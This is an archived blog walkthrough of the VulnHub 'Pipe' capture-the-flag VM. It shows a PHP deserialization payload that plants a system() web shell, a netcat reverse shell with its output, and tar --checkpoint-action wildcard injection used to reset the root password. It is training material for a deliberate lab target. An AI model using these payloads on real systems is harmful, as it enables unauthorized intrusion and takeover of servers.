<!DOCTYPE HTML>
<html lang="en-US">

<!-- Mirrored from highon.coffee/blog/pipe-ctf-walkthrough/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 29 Dec 2022 15:33:34 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="UTF-8">
<script src="../../cdn-cgi/apps/head/oTwK22odZsY2CPSkVz5V2kmEjP0.js"></script><link rel="canonical" href="index.html">
<title>/dev/random Pipe walkthrough</title>
<meta name="description" content="Walkthrough for /dev/random: Pipe a VulnHub CTF boot2root.">
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="alternate" type="application/rss+xml" title="highon.coffee - penentration testing, hacking and coffee" href="../../feed.xml">

<link rel="stylesheet" type="text/css" href="../../css/screen.css">

<link rel="icon" type="image/x-icon" href="../../favicon.ico">
<!--[if lt IE 9]>
  <script src="/js/html5shiv.min.js"></script>
  <script src="/js/respond.min.js"></script>
  <![endif]-->


</head>
<body class="wrap">
<header>
<nav class="mobile-nav show-on-mobiles">
<ul>
<li class="">
<a href="../../index.html">Home</a>
</li>
<li class="current">
<a href="../index.html">Blog</a>
</li>
<li class="">
<a href="../../about/index.html"><span class="hide-on-mobiles">About</span></a>
</li>
<li class="">
<a href="../../services/index.html"><span class="hide-on-mobiles">Services</span></a>
</li>
</ul>
</nav>
<div class="grid">
<div class="unit one-third center-on-mobiles">
<h1>
<a href="../../index.html">
<span>Zero-day</span>
<img src="../../img/highoncoffee.png" width="300" height="115" alt="Logo">
</a>
</h1>
</div>
<nav class="main-nav unit two-thirds hide-on-mobiles">
<ul>
<li class="">
<a href="../../index.html">Home</a>
</li>
<li class="current">
<a href="../index.html">Blog</a>
</li>
<li class="">
<a href="../../about/index.html"><span class="hide-on-mobiles">About</span></a>
</li>
<li class="">
<a href="../../services/index.html"><span class="hide-on-mobiles">Services</span></a>
</li>
</ul>
</nav>
</div>
</header>
<section class="blog">
<div class="grid">
<div class="docs-nav-mobile unit whole show-on-mobiles">
<select onchange="if (this.value) window.location.href=this.value">
<option value="">Navigate the blog…</option>
<option value="/blog/">Home</option>
<optgroup label="v1.x">
<option value="/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl</option>
<option value="/blog/insecure-direct-object-reference-idor/">Insecure Direct Object Reference (IDOR): Definition, Examples & How to Find</option>
<option value="/blog/nmap-cheat-sheet/">Nmap Cheat Sheet: Commands & Examples (2022)</option>
<option value="/blog/encrypted-note-taking-solution/">Encrypted Notes App Solution (iOS, Android, MacOS, Linux, Windows)</option>
<option value="/blog/dns-tunnel-dnscat2-cheat-sheet/">DNS Tunneling dnscat2 Cheat Sheet</option>
<option value="/blog/ssh-lateral-movement-cheat-sheet/">SSH Lateral Movement Cheat Sheet</option>
<option value="/blog/android-app-pen-testing-environment/">Android Pen Testing Environment Setup</option>
<option value="/blog/password-reset-security-testing-cheat-sheet/">Password Reset Testing Cheat Sheet</option>
<option value="/blog/ssrf-cheat-sheet/">SSRF Cheat Sheet & Bypass Techniques</option>
<option value="/blog/penetration-testing-tools-cheat-sheet/">Pen Testing Tools Cheat Sheet</option>
<option value="/blog/lfi-cheat-sheet/">LFI Cheat Sheet</option>
<option value="/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</option>
<option value="/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</option>

<option value="/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</option>
<option value="/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</option>
<option value="/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</option>
<option value="/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</option>
<option value="/blog/sleepy-ctf-walkthrough/">/dev/random: Sleepy Walkthrough CTF</option>
<option value="/blog/pipe-ctf-walkthrough/">/dev/random Pipe walkthrough</option>
<option value="/blog/lord-of-the-root-walkthrough/">Lord of the Root Walkthrough CTF</option>
<option value="/blog/vi-cheat-sheet/">Vim Cheat Sheet [2022 Update] + NEOVIM</option>
<option value="/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</option>
<option value="/blog/skytower-walkthrough/">SkyTower - Walkthrough</option>
<option value="/blog/zorz-walkthrough/">Zorz Walkthrough</option>
<option value="/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</option>
<option value="/blog/freshly-walkthrough/">Freshly Walkthrough</option>
<option value="/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</option>
<option value="/blog/fartknocker-walkthrough/">FartKnocker - Walkthrough</option>
<option value="/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</option>
<option value="/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet</option>
<option value="/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</option>
<option value="/blog/security-harden-centos-7/">Security Harden CentOS 7</option>
<option value="/blog/ssh-meterpreter-pivoting-techniques/">SSH & Meterpreter Pivoting Techniques</option>
<option value="/blog/howto-install-quassel-ubuntu/">HowTo Install Quassel on Ubuntu</option>
<option value="/blog/sokar-walkthrough/">Sokar - Walkthrough</option>
<option value="/blog/tr0ll-2-walkthrough/">Tr0ll 2 Walkthrough</option>
<option value="/blog/tr0ll-1-walkthrough/">Tr0ll 1 Walkthrough</option>
<option value="/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</option>
<option value="/blog/shellshock-pen-testers-lab-walkthrough/">Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough</option>
<option value="/blog/keepnote-macbook-install-instructions/">HowTo Install KeepNote on OSX Mavericks</option>
<option value="/blog/lamp-security-ctf8-walkthrough/">LAMP Security CTF8 - Walkthrough</option>
<option value="/blog/kioptrix-level-2014-walkthrough/">Kioptrix Level 2014 Walkthrough</option>
<option value="/blog/lamp-security-ctf7-walkthrough/">LAMP Security CTF7 - Walkthrough</option>
<option value="/blog/lamp-security-ctf6-walkthrough/">LAMP Security CTF6 - Walkthrough</option>
<option value="/blog/lamp-security-ctf5-walkthrough/">LAMP Security CTF5 - Walkthrough</option>
<option value="/blog/lamp-security-ctf4-walkthrough/">LAMP Security CTF4 - Walkthrough</option>
<option value="/blog/kioptrix-level-1-2-walkthrough/">Kioptrix Level 1.2 Walkthrough</option>
<option value="/blog/kioptrix-level-1-1-walkthrough/">Kioptrix Level 1.1 Walkthrough</option>
<option value="/blog/kioptrix-level-1-walkthrough/">Kioptrix Level 1 Walkthrough</option>
</optgroup>
</select>
</div>
<div class="unit four-fifths">
<article>
<h2>
/dev/random Pipe walkthrough
<a href="index.html" class="permalink" title="Permalink">∞</a>
</h2>
<span class="post-category">
<span class="label">
walkthroughs
</span>
</span>
<div class="post-meta">
<span class="post-date">
26 Nov 2015
</span>
<a href="https://twitter.com/Arr0way" class="post-author">
<img src="https://github.com/Arr0way.png" class="avatar" alt="Arr0way" width="24" height="24">
Arr0way
</a>
</div>
<div class="post-content">
<div class="coffee-rating">
<table>
<tbody>
<tr>
<td>
<p><code>Coffee Difficulty Rating:</code></p>
</td>
<td>
<p><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i></p>
</td>
</tr>
</tbody>
</table>
</div>
<ul id="markdown-toc">
<li><a href="#description" id="markdown-toc-description">Description</a></li>
<li><a href="#enumeration" id="markdown-toc-enumeration">Enumeration</a> <ul>
<li><a href="#service-enumeration" id="markdown-toc-service-enumeration">Service Enumeration</a></li>
<li><a href="#http-enumeration" id="markdown-toc-http-enumeration">HTTP Enumeration</a></li>
</ul>
</li>
<li><a href="#source-code-interrogation" id="markdown-toc-source-code-interrogation">Source Code Interrogation</a> <ul>
<li><a href="#phpjs-interrogation" id="markdown-toc-phpjs-interrogation">php.js Interrogation</a></li>
<li><a href="#logphpbak-interrogation" id="markdown-toc-logphpbak-interrogation">log.php.BAK Interrogation</a></li>
</ul>
</li>
<li><a href="#burp-suite---post-request" id="markdown-toc-burp-suite---post-request">Burp Suite - POST Request</a></li>
<li><a href="#burp-decode-string" id="markdown-toc-burp-decode-string">Burp decode string</a></li>
<li><a href="#injecting-reverse-shell-code" id="markdown-toc-injecting-reverse-shell-code">Injecting Reverse Shell Code</a></li>
<li><a href="#php-shell" id="markdown-toc-php-shell">PHP Shell</a></li>
<li><a href="#reverse-shell" id="markdown-toc-reverse-shell">Reverse Shell</a></li>
<li><a href="#linux-local-privilege-escalation" id="markdown-toc-linux-local-privilege-escalation">Linux Local Privilege Escalation</a></li>
<li><a href="#tar--unix-wildcards-local-privilege-escalation" id="markdown-toc-tar--unix-wildcards-local-privilege-escalation">Tar Unix Wildcards Local Privilege Escalation</a> <ul>
<li><a href="#unix-wildcards" id="markdown-toc-unix-wildcards">Unix Wildcards</a></li>
<li><a href="#tar-arbitrary-command-execution" id="markdown-toc-tar-arbitrary-command-execution">Tar Arbitrary Command Execution</a></li>
</ul>
</li>
<li><a href="#root-flag" id="markdown-toc-root-flag">Root Flag</a></li>
</ul>
<h2 id="description">Description</h2>
<p>Another short, but fun VM.</p>
<p><strong>Author:</strong> <a href="https://twitter.com/s4gi_">@s4gi_ </a></p>
<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/devrandom-pipe,124/">/dev/random: Pipe</a> via <a href="https://twitter.com/VulnHub">@VulnHub</a></p>
<figure class="highlight"><pre><code class="language-bash" data-lang="bash">_______.__               
<span class="se">\_</span>_____   <span class="se">\_</span>_|_____   ____  
 |     ___/  <span class="se">\_</span>___ <span class="se">\_</span>/ __ <span class="se">\</span>
  |    |   |  |  |_&gt; <span class="o">&gt;</span>  ___/
   |____|   |__|   __/ <span class="se">\_</span>__  <span class="o">&gt;</span>
                |__|        <span class="se">\/</span>  ·VM· <span class="o">(</span>MiNi CHaLLeNGe BuiLT FoR ZaCoN Vi<span class="o">)</span></code></pre></figure>
<h2 id="enumeration">Enumeration</h2>
<figure class="highlight"><pre><code class="language-bash" data-lang="bash">PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 6.7p1 Debian 5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   1024 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f <span class="o">(</span>DSA<span class="o">)</span>
|   2048 ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 <span class="o">(</span>RSA<span class="o">)</span>
|_  256 d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 <span class="o">(</span>ECDSA<span class="o">)</span>
80/tcp    open  http    syn-ack Apache httpd
| http-auth:
| HTTP/1.1 401 Unauthorized
|_  Basic <span class="nv">realm</span><span class="o">=</span>index.php
|_http-server-header: Apache
|_http-title: 401 Unauthorized
111/tcp   open  rpcbind syn-ack 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          42192/udp  status
|_  100024  1          47286/tcp  status
47286/tcp open  status  syn-ack 1 <span class="o">(</span>RPC <span class="c">#100024)</span>
MAC Address: 00:0C:29:05:96:3D <span class="o">(</span>VMware<span class="o">)</span>
Device <span class="nb">type</span>: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Uptime guess: 199.640 days <span class="o">(</span>since Sat May  9 04:40:31 2015<span class="o">)</span>
Network Distance: 1 hop
TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>262 <span class="o">(</span>Good luck!<span class="o">)</span>
IP ID Sequence Generation: All zeros
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</code></pre></figure>
<h3 id="service-enumeration">Service Enumeration</h3>
<div class="mobile-side-scroller">
<table>
<thead>
<tr>
<th>Port</th>
<th>Service</th>
<th>Version Detection</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<pc><p><code>TCP: 22</code></p></pc>
</td>
<td>
<pc><p>SSH</p></pc>
</td>
<td>
<pc><p>OpenSSH 6.7p1 Debian 5</p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>TCP: 80</code></p></pc>
</td>
<td>
<pc><p>HTTP</p></pc>
</td>
<td>
<pc><p>Apache HTTPD</p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>TCP: 111</code></p></pc>
</td>
<td>
<pc><p>rcpbind</p></pc>
</td>
<td>
<pc><p>n/a</p></pc>
</td>
</tr>
</tbody>
</table>
</div>
<h3 id="http-enumeration">HTTP Enumeration</h3>
<p>Running OWASP dirbuster against port 80 exposed <code>/scriptz/</code>
containing javascript and php files.</p>
<p><img src="../../img/blog/pipe/dirbuster.png" alt="OWASP DirBuster" /></p>
<h2 id="source-code-interrogation">Source Code Interrogation</h2>
<h3 id="phpjs-interrogation">php.js Interrogation</h3>
<p><code>js.php</code> source revealed <strong>function
serialize</strong></p>
<p><strong>note:</strong> <em>the examples at the bottom.</em></p>
<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="k">function </span>serialize<span class="o">(</span>mixed_value<span class="o">)</span> <span class="o">{</span>
//  discuss at: http://phpjs.org/functions/serialize/
// original by: Arpad Ray <span class="o">(</span>mailto:<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="3a5b484a5b5e7a4a524a14545f4e">[email&#160;protected]</a><span class="o">)</span>
// improved by: Dino
// improved by: Le Torbi <span class="o">(</span>http://www.letorbi.de/<span class="o">)</span>
// improved by: Kevin van Zonneveld <span class="o">(</span>http://kevin.vanzonneveld.net/<span class="o">)</span>
// bugfixed by: Andrej Pavlovic
// bugfixed by: Garagoth
// bugfixed by: Russell Walker <span class="o">(</span>http://www.nbill.co.uk/<span class="o">)</span>
// bugfixed by: Jamie Beck <span class="o">(</span>http://www.terabit.ca/<span class="o">)</span>
// bugfixed by: Kevin van Zonneveld
//  <span class="o">(</span>http://kevin.vanzonneveld.net/<span class="o">)</span>
// bugfixed by: Ben <span class="o">(</span>http://benblume.co.uk/<span class="o">)</span>
//    input by: DtTvB  <span class="o">(</span>http://dt.in.th/2008-09-16.string-length-in-bytes.h
//    input by: Martin <span class="o">(</span>http://www.erlenwiese.de/<span class="o">)</span>
//        note: We feel the main purpose of this <span class="k">function </span>should be to ease the transport of data between php &amp; js
//        note: Aiming <span class="k">for </span>PHP-compatibility, we have to translate objects to arrays
//   example 1: serialize<span class="o">([</span><span class="s1">'Kevin'</span>, <span class="s1">'van'</span>, <span class="s1">'Zonneveld'</span><span class="o">])</span><span class="p">;</span>
//   returns 1:<span class="s1">'a:3:{i:0;s:5:"Kevin";i:1;s:3:"van";i:2;s:9:"Zonneveld";}'</span>
//   example 2: serialize<span class="o">({</span>firstName:<span class="s1">'Kevin'</span>, midName: <span class="s1">'van'</span>, surName:<span class="s1">'Zonneveld'</span><span class="o">})</span><span class="p">;</span>
//   returns 2: <span class="s1">'a:3:{s:9:"firstName";s:5:"Kevin";s:7:"midName";s:3:"van";s:7:"surName";s:9:"Zonneveld";}'</span></code></pre></figure>
<h3 id="logphpbak-interrogation">log.php.BAK Interrogation</h3>
<p>Inspection of the source revealed it works with the js file for serialization.</p>
<p><img src="../../img/blog/pipe/log.php.BAK.png" alt="log.php.BAK Source Code Review" /></p>
<h2 id="burp-suite---post-request">Burp Suite - POST Request</h2>
<p>Modifying the request from GET to POST, renendered the index.php</p>
<p><img src="../../img/blog/pipe/burp-post.png" alt="Burp POST instead of GET" /></p>
<p>Burp confirmed the Serialized object:</p>
<p><img src="../../img/blog/pipe/burp-serialized-object.png" alt="Burp Serialized Object" /></p>
<h2 id="burp-decode-string">Burp decode string</h2>
<p><img src="../../img/blog/pipe/burp-decode-string.png" alt="Burp Decode String" /></p>
<p>Right click the string, send to Decoder.</p>
<p><img src="../../img/blog/pipe/burp-decoder-smart-decode.png" alt="Burp Decoder Smart Decoder" /></p>
<p>Click “Smart decode”</p>
<p>Using the example section of the previously discovered php.js file, it was
possible to workout the serialization mechanism.</p>
<p>New modified string introduced with burp:</p>
<figure class="highlight"><pre><code class="language-js" data-lang="js"><span class="nx">O</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="dl">"</span><span class="s2">Log</span><span class="dl">"</span><span class="p">:</span><span class="mi">2</span><span class="p">:{</span><span class="nl">s</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="dl">"</span><span class="s2">filename</span><span class="dl">"</span><span class="p">;</span><span class="nl">s</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="dl">"</span><span class="s2">/var/www/html/scriptz/Meh1.txt</span><span class="dl">"</span><span class="p">;</span><span class="nl">s</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="dl">"</span><span class="s2">data</span><span class="dl">"</span><span class="p">;</span><span class="nl">s</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="dl">"</span><span class="s2">HighOnCoffee</span><span class="dl">"</span>
<span class="p">;}</span></code></pre></figure>
<p>Using Burp Decoder URL Encode the above string and using Burp Repeater to
inject.</p>
<p><img src="../../img/blog/pipe/burp-repeater.png" alt="Burp Repeater" /></p>
<p>Refreshing the scriptz directory confirmed the creation of Meh.txt containing
the text <code>HighOnCoffee</code>.</p>
<h2 id="injecting-reverse-shell-code">Injecting Reverse Shell Code</h2>
<p>Burp Decoder was leveraged to encode the following string:</p>
<figure class="highlight"><pre><code class="language-js" data-lang="js"><span class="nx">O</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="dl">"</span><span class="s2">Log</span><span class="dl">"</span><span class="p">:</span><span class="mi">2</span><span class="p">:{</span><span class="nl">s</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="dl">"</span><span class="s2">filename</span><span class="dl">"</span><span class="p">;</span><span class="nl">s</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="dl">"</span><span class="s2">/var/www/html/scriptz/shell.php</span><span class="dl">"</span><span class="p">;</span><span class="nl">s</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="dl">"</span><span class="s2">data</span><span class="dl">"</span><span class="p">;</span><span class="nl">s</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="dl">"</span><span class="s2">
&lt;?php echo '&lt;pre&gt;'; system($_GET['cmd']); echo '&lt;/pre&gt;'; ?&gt;</span><span class="dl">"</span><span class="p">;}</span></code></pre></figure>
<p>Select Encode as URL.</p>
<p>Paste encoded string into Burp Repeater:</p>
<p><img src="../../img/blog/pipe/burp-repeater-shell.png" alt="Burp Repeater PHP Shell Upload" /></p>
<h2 id="php-shell">PHP Shell</h2>
<p><img src="../../img/blog/pipe/php-shell-rce.png" alt="PHP Shell RCE" />’</p>
<h2 id="reverse-shell">Reverse Shell</h2>
<p>nc is installed on the target, the php shell introduced at the previous step is leveraged to execute a netcat reverse shell.</p>
<p><img src="../../img/blog/pipe/rev-shell-exec.png" alt="Execute Netcat" /></p>
<figure class="highlight"><pre><code class="language-js" data-lang="js"><span class="p">[</span><span class="nx">root</span><span class="p">:</span><span class="o">~</span><span class="p">]</span><span class="err">#</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">v</span> <span class="o">-</span><span class="nx">n</span> <span class="o">-</span><span class="nx">l</span> <span class="o">-</span><span class="nx">p</span> <span class="mi">443</span>
<span class="nx">listening</span> <span class="nx">on</span> <span class="p">[</span><span class="nx">any</span><span class="p">]</span> <span class="mi">443</span> <span class="p">...</span>
<span class="nx">connect</span> <span class="nx">to</span> <span class="p">[</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">30.134</span><span class="p">]</span> <span class="k">from</span> <span class="p">(</span><span class="nx">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">30.142</span><span class="p">]</span> <span class="mi">37957</span>
<span class="nx">id</span>
<span class="nx">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="p">)</span> <span class="nx">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="p">)</span> <span class="nx">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="p">)</span>
<span class="nx">whoami</span>
<span class="nx">www</span><span class="o">-</span><span class="nx">data</span></code></pre></figure>
<h2 id="linux-local-privilege-escalation">Linux Local Privilege Escalation</h2>
<p>Spawn tty:</p>
<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span></code></pre></figure>
<p>Get HighOn.Coffee linux local enumeration script:</p>
<p><code>wget https://highon.coffee/downloads/linux-local-enum.sh</code></p>
<p><img src="../../img/blog/pipe/enum-rene-home.png" alt="HighOn.Coffee script enum" /></p>
<p>Inspection of <code>/etc/crontab</code> exposed the script
<code>/usr/bin/compress.sh</code> which is world readable.</p>
<p><img src="../../img/blog/pipe/crontab.png" alt="crontab" /></p>
<h2 id="tar--unix-wildcards-local-privilege-escalation">Tar Unix Wildcards Local Privilege Escalation</h2>
<h3 id="unix-wildcards">Unix Wildcards</h3>
<p>The previously discovered backup script uses * to perform a backup of all files
within the directory <code>/home/rene/backup/</code>. Due to poorly configured file system
permission on the backup directory, it’s possible to introduce files in the
backup directory which tar will process when it backs up the files in the directory.</p>
<h3 id="tar-arbitrary-command-execution">Tar Arbitrary Command Execution</h3>
<p>Tar’s <code>--checkpoint-action</code> parameter can be abused to
execute arbitrary code as the user executing the tar binary.
<code>--checkpoint-action</code> exists as a tar feature allowing binary
execution of a command when the file prefixed with
<code>--checkpoint-action=exec=COMMAND-HERE</code> is reached.</p>
<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="0d7a7a7a20696c796c4d7d647d68">[email&#160;protected]</a>:/home/rene/backup<span class="nv">$ </span><span class="nb">echo</span> <span class="o">&gt;</span> <span class="nt">--checkpoint-action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span>sh<span class="se">\ </span>passwd.sh<span class="p">;</span>
&lt;ckup<span class="nv">$ </span><span class="nb">echo</span> <span class="o">&gt;</span> <span class="nt">--checkpoint-action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span>sh<span class="se">\ </span>passwd.sh<span class="p">;</span>                        
<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="4d3a3a3a60292c392c0d3d243d28">[email&#160;protected]</a>:/home/rene/backup<span class="nv">$ </span><span class="nb">echo</span> <span class="o">&gt;</span> <span class="nt">--checkpoint</span><span class="o">=</span>1<span class="p">;</span>
<span class="nb">echo</span> <span class="o">&gt;</span> <span class="nt">--checkpoint</span><span class="o">=</span>1<span class="p">;</span></code></pre></figure>
<p>The above leverages the tar arbitrary command execution, reseting the root
account password when the cronjob is processed (every 5 minutes).</p>
<h2 id="root-flag">Root Flag</h2>
<p>After 5 minutes, escalate root privileges by executing <code>su -</code>
and entering the password <code>passwd</code>.</p>
<p><img src="../../img/blog/pipe/pipe-root-flag.png" alt="Pipe Root Flag VulnHub" /></p>
<p>Thanks for the VM :)</p>
</div>
<section class="share-box">
<div class="grid">
<div class="unit whole">
<div class="grid pane">
<div class="unit whole center-on-mobiles">
<div class="pane-content">
<h2>Share this on...</h2>
<p><a href="https://twitter.com/intent/tweet?text=/dev/random%20Pipe%20walkthrough&amp;url=https://highon.coffee/blog/pipe-ctf-walkthrough/&amp;via=Arr0way&amp;related=Arr0way" rel="nofollow" target="_blank" title="Share on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
<a href="https://facebook.com/sharer.php?u=https://highon.coffee/blog/pipe-ctf-walkthrough/" rel="nofollow" target="_blank" title="Share on Facebook"><i class="fa fa-facebook-square" aria-hidden="true"></i> Facebook</a>
<a href="https://plus.google.com/share?url=https://highon.coffee/blog/pipe-ctf-walkthrough/" rel="nofollow" target="_blank" title="Share on Google+"><i class="fa fa-google-plus-square" aria-hidden="true"></i> Google+</a>
<a href="https://www.reddit.com/submit?url=https://highon.coffee/blog/pipe-ctf-walkthrough/&amp;title=/dev/random%20Pipe%20walkthrough" rel="nofollow" target="_blank" title="Share on Reddit"><i class="fa fa-reddit-square" aria-hidden="true"></i> Reddit</a></p>
<h2><br>Follow Arr0way</h2>
<p><a href="https://infosec.exchange/@Arr0way" rel="nofollow" target="_blank" title="Follow Arr0way on Mastodon"><i class="fa fa-twitter-square" aria-hidden="true"></i> Mastodon</a>
<p><a href="https://twitter.com/Arr0way" rel="nofollow" target="_blank" title="Follow Arr0way on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
<a href="https://github.com/Arr0way" rel="nofollow" target="_blank" title="Follow Arr0way on GitHub"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></p>
 <p><br></p>
</div>
</div>
<h2><br>Also... <br> <br>You might want to read these</h2>
</div>
</div>
</section>
<div class="mobile-side-scroller">
<table>
<thead>
<tr>
<th>Category</th>
<th>Post Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../reverse-shell-cheat-sheet/index.html">Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>Web App Security</code></p></pc>
</td>
<td>
<pc><p><b><a href="../insecure-direct-object-reference-idor/index.html">Insecure Direct Object Reference (IDOR): Definition, Examples & How to Find</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../nmap-cheat-sheet/index.html">Nmap Cheat Sheet: Commands & Examples (2022)</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>SecOps</code></p></pc>
</td>
<td>
<pc><p><b><a href="../encrypted-note-taking-solution/index.html">Encrypted Notes App Solution (iOS, Android, MacOS, Linux, Windows)</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../dns-tunnel-dnscat2-cheat-sheet/index.html">DNS Tunneling dnscat2 Cheat Sheet</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../ssh-lateral-movement-cheat-sheet/index.html">SSH Lateral Movement Cheat Sheet</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../android-app-pen-testing-environment/index.html">Android Pen Testing Environment Setup</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../password-reset-security-testing-cheat-sheet/index.html">Password Reset Testing Cheat Sheet</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../ssrf-cheat-sheet/index.html">SSRF Cheat Sheet & Bypass Techniques</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../penetration-testing-tools-cheat-sheet/index.html">Pen Testing Tools Cheat Sheet</a></b></p></pc>
</td>
</tr>
</tbody>
</table>
</div>
</article>
</div>
<div class="unit one-fifth hide-on-mobiles">
<aside>
<ul>
<li class="">
<a href="../../services/pen-testing/index.html">Pen Testing Services</a>
</li>
<li class="">
<a href="../cheat-sheet/index.html">Cheat Sheets</a>
</li>
<li class="">
<a href="../techniques/index.html">Techniques</a>
</li>
<li class="">
<a href="../security-hardening/index.html">Security Hardening</a>
</li>
<li class="">
<a href="../walkthroughs/index.html">WalkThroughs</a>
</li>
</ul>
<h4>Cheat Sheets</h4>
<ul>
 <li class="">
<a href="../reverse-shell-cheat-sheet/index.html">Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl</a>
</li>
<li class="">
<a href="../nmap-cheat-sheet/index.html">Nmap Cheat Sheet: Commands & Examples (2022)</a>
</li>
<li class="">
<a href="../dns-tunnel-dnscat2-cheat-sheet/index.html">DNS Tunneling dnscat2 Cheat Sheet</a>
</li>
<li class="">
<a href="../ssh-lateral-movement-cheat-sheet/index.html">SSH Lateral Movement Cheat Sheet</a>
</li>
<li class="">
<a href="../android-app-pen-testing-environment/index.html">Android Pen Testing Environment Setup</a>
</li>
<li class="">
<a href="../password-reset-security-testing-cheat-sheet/index.html">Password Reset Testing Cheat Sheet</a>
</li>
<li class="">
<a href="../ssrf-cheat-sheet/index.html">SSRF Cheat Sheet & Bypass Techniques</a>
</li>
<li class="">
<a href="../penetration-testing-tools-cheat-sheet/index.html">Pen Testing Tools Cheat Sheet</a>
</li>
<li class="">
<a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a>
</li>
<li class="">
<a href="../vi-cheat-sheet/index.html">Vim Cheat Sheet [2022 Update] + NEOVIM</a>
</li>
<li class="">
<a href="../systemd-cheat-sheet/index.html">Systemd Cheat Sheet</a>
</li>
<li class="">
<a href="../nbtscan-cheat-sheet/index.html">nbtscan Cheat Sheet</a>
</li>
<li class="">
